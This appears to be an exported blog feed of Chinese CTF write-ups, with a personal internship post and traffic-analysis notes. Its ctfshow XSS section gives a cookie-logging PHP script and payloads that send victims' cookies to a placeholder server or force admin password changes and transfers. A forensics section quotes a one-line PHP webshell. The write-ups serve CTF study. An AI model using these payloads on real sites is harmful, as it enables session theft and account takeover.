<p>这种看起来可以防御CSRF攻击，因为它不具备CSRF存在的条件：网站不仅仅依赖于cookie进行会话处理，并且请求包含一个攻击者无法确定其值的参数。然而，有多种方法可以打破防御，所以还是有被CSRF攻击的可能。</p>
<p>还有很多具体的情况，ｂｐ靶场里也是有的。</p>
<p>CSRF还是很简单的，原理也比较好理解，具体绕过始终也离不开cookie，token，请求头之类的。</p>
]]></content>
      <tags>
        <tag>Web</tag>
        <tag>CSRF</tag>
      </tags>
  </entry>
  <entry>
    <title>(陇剑杯 2021) SQL注入系列</title>
    <url>/2022/04/29/SQLflow/</url>
    <content><![CDATA[<h3 id="（1）"><a href="#（1）" class="headerlink" title="（1）"></a>（1）</h3><p>第一题，看SQL注入的语句，很明显是布尔盲注的特征</p>
<h3 id="（2）"><a href="#（2）" class="headerlink" title="（2）"></a>（2）</h3><p>这题更没劲，根据我的经验，流量分析倒着看就对了</p>
<blockquote>
<p>(select%20flag%20from%20sqli.flag),43,1)%20=%20’+’,1,(select%20table_name%20from%20information_schema.tables)</p>
</blockquote>
<p>数据库名#表名#字段名显而易见</p>
<h3 id="（3）"><a href="#（3）" class="headerlink" title="（3）"></a>（3）</h3><p>将日志导入excel，筛选返回长度479 480 481 482</p>
<p><img src="https://img-blog.csdnimg.cn/d893e06b2ded4f9f85d031d4fd2c7b7d.png"></p>
<p>然后再拿word替换一下，得到</p>
<p><img src="https://img-blog.csdnimg.cn/a24dd5c5e019430b8b986821ee2968a3.png"></p>
<p>flag{deddcd67-bcfd-487e-b940-1217e668c7db}</p>
<p>当然也可以写个脚本</p>
]]></content>
      <tags>
        <tag>wp</tag>
        <tag>flow</tag>
        <tag>Misc</tag>
      </tags>
  </entry>
  <entry>
    <title>蓝帽杯_电子取证</title>
    <url>/2022/07/10/blue_hat/</url>
    <content><![CDATA[<p>第一次做这么多取证题，也是学到了很多东西</p>
<h3 id="手机取证"><a href="#手机取证" class="headerlink" title="手机取证"></a>手机取证</h3><h4 id="手机取证-1"><a href="#手机取证-1" class="headerlink" title="手机取证_1"></a>手机取证_1</h4><blockquote>
<p>  ​    现对一个苹果手机进行取证，请您对以下问题进行分析解答。</p>
<p>  ​    627604C2-C586-48C1-AA16-FF33C3022159.PNG图片的分辨率是？（答案参考格式：1920x1080）</p>
<p>  ​    附件下载地址见平台公告，解压密码为0ba6b2c094cbb3a04681a135487a19cb</p>
</blockquote>
<p>盘古阅读器打开，搜索一下题目中的图片，得到</p>
<p><img src="https://s1.ax1x.com/2022/07/09/jDLvkT.png"></p>
<p>我们保存下来，看一下属性</p>
<p>得到分辨率</p>
<p><img src="https://s1.ax1x.com/2022/07/09/jDOk0x.png"></p>
<h4 id="手机取证-2"><a href="#手机取证-2" class="headerlink" title="手机取证_2"></a>手机取证_2</h4><p>还是上题做法，我们搜一下单号</p>
<p><img src="https://s1.ax1x.com/2022/07/09/jDODH0.png"></p>
<h3 id="计算机取证"><a href="#计算机取证" class="headerlink" title="计算机取证"></a>计算机取证</h3><h4 id="计算机取证-1"><a href="#计算机取证-1" class="headerlink" title="计算机取证_1"></a>计算机取证_1</h4><blockquote>
<p>  现对一个windows计算机进行取证，请您对以下问题进行分析解答。</p>
<p>  从内存镜像中获得taqi7的开机密码是多少？（答案参考格式：abcABC123）</p>
<p>  附件下载地址见平台公告，解压密码为93ce7ea39bdd7baa137f1e9b963b7ee5</p>
</blockquote>
<p>内存取证，来到强大的vol</p>
<p>详情见截图</p>
<p><img src="https://s1.ax1x.com/2022/07/09/jr93Yq.png"></p>
<p>得到后，我们进行MD5解密</p>
<p><img src="https://s1.ax1x.com/2022/07/09/jr9BkR.png"></p>
<h4 id="计算机取证-2"><a href="#计算机取证-2" class="headerlink" title="计算机取证_2"></a>计算机取证_2</h4><blockquote>
<p>  制作该内存镜像的进程Pid号是多少？（答案参考格式：1024）</p>
</blockquote>
<p>这次我们打开火眼</p>
<p><img src="https://s1.ax1x.com/2022/07/09/jrCp90.png"></p>
<p>然后找到进程</p>
<p><img src="https://s1.ax1x.com/2022/07/09/jrCVE9.png"></p>
<h4 id="计算机取证-3"><a href="#计算机取证-3" class="headerlink" title="计算机取证_3"></a>计算机取证_3</h4><blockquote>
<p>  bitlokcer分区某office文件中存在的flag值为？（答案参考格式：flag{abcABC123}）</p>
</blockquote>
<p>来到取证大师，用小工具解析出密钥</p>
<p><img src="https://s1.ax1x.com/2022/07/09/jrkIQx.png" alt="https://s1.ax1x.com/2022/07/09/jrkIQx.png"></p>
<p>然后保存下来</p>
<p><img src="https://s1.ax1x.com/2022/07/09/jrkjfA.png"></p>
<p>解开，得到两个office文件，全部导出</p>
<p><img src="https://s1.ax1x.com/2022/07/09/jrAZpn.png"></p>
<p>再次套娃一层</p>
<p><img src="https://s1.ax1x.com/2022/07/09/jrABAe.png"></p>
<p>我们还能发现pass.txt,打开是个字典，正好可以爆破</p>
<p><img src="https://s1.ax1x.com/2022/07/09/jrVHmV.png"></p>
<p><img src="https://s1.ax1x.com/2022/07/09/jrEu8A.png"></p>
<h4 id="计算机取证-4"><a href="#计算机取证-4" class="headerlink" title="计算机取证_4"></a>计算机取证_4</h4><blockquote>
<p>  TrueCrypt加密中存在的flag值为？（答案参考格式：flag{abcABC123}）</p>
</blockquote>
<p>再回到vol</p>
<p><img src="https://s1.ax1x.com/2022/07/09/jrmndf.png"></p>
<p>万物皆可binwalk</p>
<p><img src="https://s1.ax1x.com/2022/07/09/jru3bq.png"></p>
<p>拿到了一坨压缩包，大致翻了翻，只有一个带密码的，好像有些东西</p>
<p><img src="https://s1.ax1x.com/2022/07/09/jru0M9.png"></p>
<p>好像损坏了，由于手头只有修zip的工具，生改后缀，成功，爆破</p>
<p><img src="https://s1.ax1x.com/2022/07/09/jrKFWF.png"></p>
<p>flag：<code>flag&#123;1349934913913991394cacacacacacc&#125;</code></p>
<h3 id="app取证"><a href="#app取证" class="headerlink" title="app取证"></a>app取证</h3><h4 id="程序分析-1"><a href="#程序分析-1" class="headerlink" title="程序分析_1"></a>程序分析_1</h4><blockquote>
<p>  现已获取某个APP程序，请您对以下问题进行分析解答。</p>
<p>  本程序包名是？（答案参考格式：abc.xx.de）</p>
<p>  <a href="https://pan.baidu.com/s/1VrweUuSf0UHoEKyvnEglWQ">附件下载</a> 提取码（GAME）<a href="https://share.weiyun.com/tZ3vmudB">备用下载</a></p>
</blockquote>
<p>打开我们的雷电工具，显而易见</p>
<p><img src="https://s1.ax1x.com/2022/07/09/jrliJf.png"></p>
<h4 id="程序分析-2"><a href="#程序分析-2" class="headerlink" title="程序分析_2"></a>程序分析_2</h4><blockquote>
<p>  本程序的入口是？（答案参考格式：abc.xx.de）</p>
</blockquote>
<p>继续看</p>
<p><img src="https://s1.ax1x.com/2022/07/09/jrl3SU.png"></p>
<p>得到<code>minmtta.hemjcbm.ahibyws.MainActivity</code></p>
<h4 id="程序分析-3"><a href="#程序分析-3" class="headerlink" title="程序分析_3"></a>程序分析_3</h4><blockquote>
<p>  本程序的服务器地址的密文是？（答案参考格式：abcABC123）</p>
</blockquote>
<p>反编译一下，拿到源码</p>
<p><img src="https://s1.ax1x.com/2022/07/09/jrlhff.png"></p>
<p><code>aHR0cHM6Ly9hbnNqay5lY3hlaW8ueHl6</code></p>
<h4 id="程序分析-4"><a href="#程序分析-4" class="headerlink" title="程序分析_4"></a>程序分析_4</h4><blockquote>
<p>  本程序实现安全检测的类的名称是？（答案参考格式：abcABC123）</p>
</blockquote>
<p>继续顺一下我们的源码，安全检测，发现了相关源码</p>
<p><img src="https://s1.ax1x.com/2022/07/09/jr1KnH.png"></p>
<h3 id="网站取证"><a href="#网站取证" class="headerlink" title="网站取证"></a>网站取证</h3><h4 id="网站取证-1"><a href="#网站取证-1" class="headerlink" title="网站取证_1"></a>网站取证_1</h4><blockquote>
<p>  据了解，某网上商城系一团伙日常资金往来用，从2022年4月1日起使用虚拟币GG币进行交易，现已获得该网站的源代码以及部分数据库备份文件，请您对以下问题进行分析解答。</p>
<p>  请从网站源码中找出木马文件，并提交木马连接的密码。（答案参考格式：abcABC123）</p>
<p>  <a href="https://pan.baidu.com/s/1Z9pbTa18qP70-LQJq-S0qA">附件下载</a> 提取码（GAME）<a href="https://share.weiyun.com/x3wua9ys">备用下载</a></p>
</blockquote>
<p>下载附件，看一下，全是源码，咱们vsc打开翻一翻</p>
<p>然后挨着翻也就翻到了一句话木马</p>
<p><code>&lt;?php assert(@$_POST[&#39;lanmaobei666&#39;]); ?&gt;</code></p>
<p><img src="https://s1.ax1x.com/2022/07/09/jr178K.png"></p>
<h4 id="网站取证-2"><a href="#网站取证-2" class="headerlink" title="网站取证_2"></a>网站取证_2</h4><blockquote>
<p>  请提交数据库连接的明文密码。（答案参考格式：abcABC123）</p>
</blockquote>
<p><img src="https://s1.ax1x.com/2022/07/09/jrGNjO.png"></p>
<p>passwd指到了<code>my_encrypt()</code></p>
<p><img src="https://img-blog.csdnimg.cn/8cf1d0e79632443799ffc570e2e6b7d7.png"></p>
<p>根据源码得到解码脚本</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">my_encrypt</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$str</span> = <span class="string">&#x27;P3LMJ4uCbkFJ/RarywrCvA==&#x27;</span>;</span><br><span class="line">    <span class="variable">$str</span> = <span class="title function_ invoke__">str_replace</span>(<span class="keyword">array</span>(<span class="string">&quot;/r/n&quot;</span>, <span class="string">&quot;/r&quot;</span>, <span class="string">&quot;/n&quot;</span>), <span class="string">&quot;&quot;</span>, <span class="variable">$str</span>);</span><br><span class="line">    <span class="variable">$key</span> = <span class="string">&#x27;PanGuShi&#x27;</span>;</span><br><span class="line">    <span class="variable">$iv</span> = <span class="title function_ invoke__">substr</span>(<span class="title function_ invoke__">sha1</span>(<span class="variable">$key</span>),<span class="number">0</span>,<span class="number">16</span>);</span><br><span class="line">    <span class="variable">$td</span> = <span class="title function_ invoke__">mcrypt_module_open</span>(MCRYPT_RIJNDAEL_128,<span class="string">&quot;&quot;</span>,MCRYPT_MODE_CBC,<span class="string">&quot;&quot;</span>);</span><br><span class="line">    <span class="title function_ invoke__">mcrypt_generic_init</span>(<span class="variable">$td</span>, <span class="string">&quot;PanGuShi&quot;</span>, <span class="variable">$iv</span>);</span><br><span class="line">    <span class="variable">$decode</span> = <span class="title function_ invoke__">base64_decode</span>(<span class="variable">$str</span>);</span><br><span class="line">    <span class="variable">$dencrypted</span> = <span class="title function_ invoke__">mdecrypt_generic</span>(<span class="variable">$td</span>, <span class="variable">$decode</span>);</span><br><span class="line">    <span class="title function_ invoke__">mcrypt_generic_deinit</span>(<span class="variable">$td</span>);</span><br><span class="line">    <span class="title function_ invoke__">mcrypt_module_close</span>(<span class="variable">$td</span>);</span><br><span class="line">    <span class="variable">$dencrypted</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$dencrypted</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$dencrypted</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">my_encrypt</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>结果<code>KBLT123</code></p>
<h4 id="网站取证-3"><a href="#网站取证-3" class="headerlink" title="网站取证_3"></a>网站取证_3</h4><blockquote>
<p>  请提交数据库金额加密混淆使用的盐值。（答案参考格式：abcABC123）</p>
</blockquote>
<p>还是翻源码，得到</p>
<p><img src="https://img-blog.csdnimg.cn/b2badf8b9054448d9bc19443ce6c99af.png"></p>
<p><code>function decrypt($data, $key = &#39;jyzg123456&#39;)</code></p>
]]></content>
      <tags>
        <tag>wp</tag>
        <tag>Forensics</tag>
        <tag>SkyMirror</tag>
      </tags>
  </entry>
  <entry>
    <title>ctfshow_xss_wp</title>
    <url>/2022/05/14/ctfshow_xss_wp/</url>
    <content><![CDATA[<p>跨站脚本攻击在这一套题目中体现的淋漓尽致。</p>
<h3 id="web316"><a href="#web316" class="headerlink" title="web316"></a>web316</h3><p>跨站脚本攻击，现时跨站，这里我用的自己的服务器，当然也有用各种xss网站的，</p>
<p>都差不多，比如<a href="http://xsscom.com/%E5%8A%A0%E8%BD%BD%E7%9A%84%E8%BF%98%E6%AF%94%E8%BE%83%E5%BF%AB%E3%80%82">http://xsscom.com/加载的还比较快。</a></p>
<p>我用的自己服务器，贴上一个这个脚本</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$cookie</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;1&#x27;</span>];</span><br><span class="line"><span class="variable">$log</span> = <span class="title function_ invoke__">fopen</span>(<span class="string">&quot;flag.txt&quot;</span>, <span class="string">&quot;a&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">fwrite</span>(<span class="variable">$log</span>, <span class="variable">$cookie</span> . <span class="string">&quot;\n&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">fclose</span>(<span class="variable">$log</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>我这里建议文件名不要用xss，因为我刚开始用的xss，后边会有题目把xss过滤了。</p>
<p>payload：</p>
<p><code>&lt;script&gt;window.location.href=&#39;http://自己服务器IP/a.php?1=&#39;+document.cookie&lt;/script&gt;</code></p>
<p><code>window.location.href</code>可以理解成是，跳转到href里，具体参考<a href="https://www.cnblogs.com/Qian123/p/5345298.html#_label3">https://www.cnblogs.com/Qian123/p/5345298.html#_label3</a></p>
<p><code>document.cookie</code>就是创建一个cookie,这里是把目标cookie窃取下来，具体参考<a href="https://www.runoob.com/jsref/prop-doc-cookie.html">https://www.runoob.com/jsref/prop-doc-cookie.html</a></p>
<h3 id="web317-319"><a href="#web317-319" class="headerlink" title="web317-319"></a>web317-319</h3><p>这里属于是一招鲜吃遍天了，这里过滤的东西都不一样，有img，script，xss</p>
<p>但是payload:</p>
<p><code>&lt;body onload=&quot;document.location.href=&#39;http://IP/a.php?1=&#39;+document.cookie&quot;&gt;&lt;/body&gt;</code></p>
<p>无敌</p>
<h3 id="web320-web326"><a href="#web320-web326" class="headerlink" title="web320-web326"></a>web320-web326</h3><p>过滤了空格，但是tab或者/或者/**/都可以用</p>
<p>所以payload:</p>
<p><code>&lt;body/onload=&quot;document.location.href=&#39;http://ip/a.php?1=&#39;+document.cookie&quot;&gt;&lt;/body&gt;</code></p>
<h3 id="web327"><a href="#web327" class="headerlink" title="web327"></a>web327</h3><p>开始来到存储型XSS，难度起来了。</p>
<p>这题注意收件人要是admin</p>
<p>然后信的内容还是老样子</p>
<p><code>&lt;body/**/onload=&quot;document.location.href=&#39;http://ip/a.php?1=&#39;+document.cookie&quot;&gt;&lt;/body&gt;</code></p>
<h3 id="web328"><a href="#web328" class="headerlink" title="web328"></a>web328</h3><p>这题打开会发现貌似没有传xss payload的地方，但是细心的同学会发现</p>
<p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202207111644982.png"></p>
<p>也就是说，如果我们是admin，说不定就拿到flag了，那咱们有了admin的cookie，是不是就能伪装成admin呢</p>
<p>那么还是怎么传payload的问题，密码为啥不能是payload，注册就拿到cookie了</p>
<p>这题body不能用了，返璞归真，用script</p>
<p><code>&lt;script&gt;document.location.href=&#39;http://ip/a.php?1=&#39;+document.cookie;&lt;/script&gt;</code></p>
<p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202207111644636.png"></p>
<p>如果你很不幸x到了自己，出了多个sessionid，那么就选最后一个</p>
<p>然后抓包，改个cookie就OK</p>
<p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202207111645031.png"></p>
<h3 id="web329"><a href="#web329" class="headerlink" title="web329"></a>web329</h3><p>在这个例子中，admin的sessionid每次会话都会变，所以没办法使用sessionid进行登录（机器人好像设置的是上去一下就下来），那么思路就是让注入的XSS Payload自动读取本页面的带有<code>ctfshow</code>的字段并发到vps上。<br> 注册一个普通账号并登录，修改一个显示密码的地方为<code>ctfshow&#123;123456&#125;</code>，然后尝试直接在console中将这段字段读出来并发送到vps中，使用jQuery的类选择器：</p>
<p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202207111645031.png"></p>
<p>群主就根据这个东西写出来了payloa</p>
<p><code>&lt;script&gt;$(&#39;.laytable-cell-1-0-1&#39;).each(function(index,value)&#123;if(value.innerHTML.indexOf(&#39;ctf&#39;+&#39;show&#123;&#39;)&gt;-1)&#123;window.location.href=&#39;http://ip/a.php?1=&#39;+value.innerHTML;&#125;&#125;);&lt;/script&gt;</code></p>
<p>还是拿这个当作密码，就可以了。</p>
<h3 id="web330"><a href="#web330" class="headerlink" title="web330"></a>web330</h3><p>上来先试一梭子上一题的payload，好像并没有成功。</p>
<p>继续看这题多了个修改密码界面，那么只要让管理员修改成我们知道的密码，就能解决了</p>
<p>x到管理员，还是得走我们的密码。先抓个包看看改密码的api</p>
<img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202207111647725.png" style="zoom:67%;" />

<p><code>&lt;script&gt;window.location.href=&#39;http://127.0.0.1/api/change.php?p=123&#39;;&lt;/script&gt;</code></p>
<p>这里的由于x的是admin，所以用了admin的本地IP<code>127.0.0.1</code></p>
<p>注册，发现并没有什么用，试试用户名，你看那用户名，很长一筐，其实之前一直没用用户名，是因为用户名只能注册一次，但是密码可以重复</p>
<p>或者保险起见，直接用户名密码全是xss</p>
<p>好了，admin#123 登陆成功，为了防止自动跳转，这里抓一下</p>
<img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202207111647186.png" style="zoom:67%;" />

<h3 id="web331"><a href="#web331" class="headerlink" title="web331"></a>web331</h3><p>上来，先试一试上一题的payload，好吧，并没有那么幸运</p>
<p>这里注意到url，发现并不是get了，那么猜测是post，抓包一看，果然是</p>
<p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202207111657280.png"></p>
<p>仿照，post的源码，写个payload就好了</p>
<img src="https://img-blog.csdnimg.cn/2374b981265e47b0937e36cfe3e3422b.png" style="zoom:67%;" />

<p><code>&lt;script&gt;$.ajax(&#123;url:&#39;api/change.php&#39;,type:&#39;post&#39;,data:&#123;p:&#39;123&#39;&#125;&#125;);&lt;/script&gt;</code></p>
<p>payload来喽，解决</p>
<p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202207111656980.png"></p>
<h3 id="web332"><a href="#web332" class="headerlink" title="web332"></a>web332</h3><p>先试一下上一题的payload，就是说，只要拿到admin了，什么都好说，然后失败了，转换思路。</p>
<p>这题很简单，要买flag嘛，但是钱不够，还有个转账口子</p>
<p>尝试转负的，然后就成功了</p>
<p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202207111654005.png"></p>
<p>购买flag，成功</p>
<p>这题也可以给自己转账，然后会发现，给自己转账是不要钱的，然后就可以一直转，只要金额少于自己的余额就行。</p>
<p>这里就不再演示了。</p>
<p>然后这好像跟xss没什么关系，现在x不到admin的密码了，我们试一试能不能直接x一下admin转账，我们抓包看一下转账的传参</p>
<p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202207111654665.png"></p>
<p>改一下上一题的payload</p>
<p><code>&lt;script&gt;$.ajax(&#123;url:&#39;api/amount.php&#39;,type:&#39;post&#39;,data:&#123;u:&#39;123&#39;,a:&#39;10000&#39;&#125;&#125;);&lt;/script&gt;</code></p>
<p>搞定啊</p>
<h3 id="web333"><a href="#web333" class="headerlink" title="web333"></a>web333</h3><p>首先试一试上一题，给自己转账是可行的，x到admin转账也是可行的。</p>
<p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202207111647124.png"></p>
<p><code>&lt;script&gt;$.ajax(&#123;url:&#39;api/amount.php&#39;,type:&#39;post&#39;,data:&#123;u:&#39;123&#39;,a:&#39;10000&#39;&#125;&#125;);&lt;/script&gt;</code></p>
<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>js很重要，可以通过js搞整个网页</p>
]]></content>
      <tags>
        <tag>Web</tag>
        <tag>XSS</tag>
        <tag>wp</tag>
        <tag>ctfshow</tag>
      </tags>
  </entry>
  <entry>
    <title>闲聊——第一次HW（实习）</title>
    <url>/2022/08/10/hw01/</url>
    <content><![CDATA[<p>我很幸运，参加了2022的国家hw行动，7.24-8.8 历时十五天，结交了一些圈内大佬</p>
<p>说实话，hw很难学到一些技术性知识，就算有，也是摸鱼时闲着没事自学的，还有就是一些安全设备使用，幸运的话，可以学一些研判甚至是溯源相关的知识。</p>
<p>hw最主要就是结实一些圈内大佬，去大城市看看，与各个厂商大佬交流，见见世面，当然可以捞一波💴，但是一定要小心，不要被黑心中介骗了。</p>
<p>这次hw，说的最多的一句话是：<code>“这🐕上海，🐕都不来，真不是人活的”</code></p>
<p>外地人在上海是真的难活，特别是一般的打工人，这边的物价是真要命，而且一辈子也买不起上海的一套房。</p>
<p>一个月房租就要2k+，每顿饭也得20+，一块油饼就要八九块，一碗豆花也要八九块</p>
<p>不过我在这边活得还是比较滋润的，因为是包差旅嘛，我就需要吃个饭花钱，而且公司还给提供吃不完的零食饮料，前几天一天还点两顿外卖，因为我是夜班嘛，就下班吃一顿，上班前吃一顿。到了后边公司零食越来越丰盛，每天就吃一顿。一般是半夜吃，然后早上吃个泡面或者小面包啥的。</p>
<p>可以晒一下我吃的东西</p>
<p>这是吃的一些泡面，自热米饭之类的</p>
<img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202208152007211.jpg" style="zoom:25%;" />

<img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202208152007221.jpg" style="zoom:25%;" />

<img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202208152007220.jpg" style="zoom:25%;" />

<img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202208152007216.jpg" style="zoom:25%;" />

<p>这一份在我们门口摆放了好久，也没人吃，好像是甲方那边的，也只有我一个人吃过，感觉还不错</p>
<img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202208152007219.jpg" style="zoom:25%;" />

<p>后边是一些日常的零食，饮料，以及人生第一瓶百岁山</p>
<img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202208152015411.jpg" style="zoom:25%;" />

<img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202208152015412.jpg" style="zoom:25%;" />

<img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202208152015413.jpg" style="zoom:25%;" />

<p>在这边的工作是比较轻松的，每天刷刷微步，吃吃零食，做做巡检，看看告警</p>
<p>在微步上我们被称作YT，鼠标猴</p>
<p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202208152018820.jpg"></p>
<p>十五天很快，一会就过去了，这里引用微步的一段话</p>
<blockquote>
<p>明天之后，你我各归岗位。太阳照常升起，小王背着双肩包挤地铁，小李又在客户现场逢着一位心仪的姑娘。人来车往，岁月静好，一切如常。<br>海水冲刷沙滩，这十五天的一切，仿佛从来没发生过。但是某个时刻，也许你我会记起，我们曾共同在中国网络空间留下一页红蓝色的篇章，刻下攻与防的痕迹。<br>战斗是为了永久的和平。无论如何，世界已经因为这场不见硝烟的演习而永久性改变。<br>功成不必在我，功成必定有我。其中故事，我们来日再续。</p>
</blockquote>
<p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202208152025576.jpg"></p>
<p>这十五天，也有两个人，让我感到非常愧疚。</p>
<p>一位是7.30那天晚上冒雨为我送外卖的骑手，他因为送我的单，淋坏了自己的手机。那天晚上雨很大，我却无能为力。</p>
<p>还有一位就是她，和我异地了一年多的她，从高中同学变成情侣又变回了高中同学</p>
<p>7.27是她的生日，我在hw，8.4是七夕，我还在hw，8.5我们成为了高中同学</p>
]]></content>
      <tags>
        <tag>HW</tag>
        <tag>chat</tag>
      </tags>
  </entry>
  <entry>
    <title>(陇剑杯 2021)ios系列</title>
    <url>/2022/04/29/ios_flow/</url>
    <content><![CDATA[<h3 id="（1）"><a href="#（1）" class="headerlink" title="（1）"></a>（1）</h3><p>根据经验，没思路就追踪TCP流</p>
<p>追到15流，会发现一坨东西，翻一翻就能得到。</p>
<p><img src="https://s1.ax1x.com/2022/04/29/LxZCuV.png"></p>
<p>很明显，3.128.156.159</p>
<h3 id="（2）"><a href="#（2）" class="headerlink" title="（2）"></a>（2）</h3><p>还是刚刚追踪的TCP流</p>
<p><img src="https://s1.ax1x.com/2022/04/29/LxZpj0.png"></p>
<p>项目连接都摆出来了</p>
<blockquote>
<p><a href="https://github.com/ph4ntonn/Stowaway/">https://github.com/ph4ntonn/Stowaway/</a></p>
</blockquote>
<p>工具就是stowaway</p>
<h3 id="（3）"><a href="#（3）" class="headerlink" title="（3）"></a>（3）</h3><p>访问项目连接，翻一翻得到了</p>
<p><img src="https://s1.ax1x.com/2022/04/29/LxVx9s.png"></p>
<p>hack4sec就是密文了</p>
<h3 id="（4）"><a href="#（4）" class="headerlink" title="（4）"></a>（4）</h3><p>翻来覆去，并没有找到跟SQL注入有关的数据，但是看见了TLS加密的</p>
<p>解密（wireshark➡编辑➡首选项➡protocols）一下，看HTTP2发现了SQL注入的语句，存下来，然后把需要的数据筛选出来，这里我看花眼了，所以写了个脚本</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line">file = <span class="built_in">open</span>(<span class="string">&quot;1.txt&quot;</span>,<span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">indata = file.read()</span><br><span class="line">obj = re.<span class="built_in">compile</span>(<span class="string">r&quot;_from_user%29%3D%22(?P&lt;wahaha&gt;.*?)%22_then_id_else&quot;</span>,re.S)</span><br><span class="line">result = obj.finditer(indata)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> it <span class="keyword">in</span> result :</span><br><span class="line">    <span class="built_in">print</span>(it.group(<span class="string">&quot;wahaha&quot;</span>))</span><br></pre></td></tr></table></figure>

<p>然后得到的数据，<a href="https://ctf.mzy0.com/CyberChef3/#recipe=From_Hex%EF%BC%8816%E8%BF%9B%E5%88%B6%E8%BD%AC%E6%8D%A2%EF%BC%89('Auto')&input=MzcgMzQgMzYgMzUgMzUgMzggNjYgMzMgMkQgNjMgMzggMzQgMzEgMkQgMzQgMzUgMzYgNjIgMkQgMzggMzUgNjQgMzcgMkQgNjQgMzYgNjMgMzAgNjYgMzIgNjUgNjQgNjEgNjIgNjIgMzIg">hex解码</a>一下，就能得到</p>
<blockquote>
<p>746558f-c841-456b-85d7-d6c0f2edabb2</p>
</blockquote>
<h3 id="（5）"><a href="#（5）" class="headerlink" title="（5）"></a>（5）</h3><p>两种办法，第一种很笨，就是用wireshark过滤，借助</p>
<blockquote>
<p>tcp.port == n</p>
</blockquote>
<p>发现10-499是有数据的</p>
<p><img src="https://s1.ax1x.com/2022/04/29/LxZScq.png"></p>
<p><img src="https://s1.ax1x.com/2022/04/29/LxVz3n.png"></p>
<p>第二种参考了雪殇的wp，<a href="https://www.cnblogs.com/wongbingming/p/13212306.html">TCP dump</a>一下</p>
<blockquote>
<p>tcpdump -n -r triffic.pcap | awk ‘{print $3}’ | sort -u &gt; ou1t.txt</p>
</blockquote>
<p><img src="https://s1.ax1x.com/2022/04/29/LxZiHU.png"></p>
<h3 id="（7）"><a href="#（7）" class="headerlink" title="（7）"></a>（7）</h3><p>看一眼access.log,很明显</p>
<p><img src="https://s1.ax1x.com/2022/04/29/LxZkEF.png"></p>
<p>再结合（4）或者（5）都能得到192.168.1.12</p>
<h3 id="（8）"><a href="#（8）" class="headerlink" title="（8）"></a>（8）</h3><p>看日志，明显。</p>
<p><img src="https://s1.ax1x.com/2022/04/29/LxZPBT.png"></p>
<p>webshell特征，所以密码为fxxk</p>
]]></content>
      <tags>
        <tag>wp</tag>
        <tag>flow</tag>
        <tag>Misc</tag>
      </tags>
  </entry>
  <entry>
    <title>Misc_流量分析_基础</title>
    <url>/2022/06/17/misc_flow/</url>
    <content><![CDATA[<p>不能鸽了，从考试周，鸽到现在，新建文件夹半个月了，今天必写出来</p>
<p>开始咱们先说点流量分析常见的题目。</p>
<h3 id="flag能直接找到"><a href="#flag能直接找到" class="headerlink" title="flag能直接找到"></a>flag能直接找到</h3><p>这部分题可能就难在谁有耐心吧，最简单的就是通过flag查找工具，直接找到flag，或者是通过常见编码后的flag</p>
<p>常见的有这几种</p>
<blockquote>
<p>#默认字符关键字<br>flag,666c6167,Zmxh,&amp;#102,464C4147</p>
<p>#默认正则关键字<br>flag{.+},666c6167\w+,Zmxh[\w=]+,&amp;#102.+</p>
<p>#其他关键字<br>key,ctf,f1ag,ffllaagg,f-l-a-g</p>
<p>#flag二进制格式<br>1100110011011000110000101100111</p>
<p>#正则编码类<br>key{.<em>},ctf{.</em>},f1ag{.*}</p>
<p>#正则匹配中文<br>[\u4E00-\u9FA5]+</p>
<p>#百里挑一正则<br>.[a-f1234567890]{17}}</p>
<p>#ip正则<br>\d+.\d+.\d+.\d+</p>
<p>#flag反写<br>{.*}galf</p>
<p>#安恒<br>dasctf</p>
<p>cyberpeace{.*} </p>
</blockquote>
<p>还有一些流量包东西很杂，一条条翻太慢了，可以在跑一下string，就一目了然</p>
<p>还有一些就是flag分段的，可能每个字母都在不同的包中，也可能分成了几段。</p>
<p>这一块中，比较难的就是编码不常见的，那玩意看见了都不一定能猜到那是flag，更何况他再藏得深一点，像第二届网刃杯的</p>
<p>ncsubj、xyp07和cryptolalia</p>
<p>这个xyp07很奇妙，拿科莱一跑就出来了。</p>
<p>cryptolalia非对称加密，这个看出来需要一定的经验。</p>
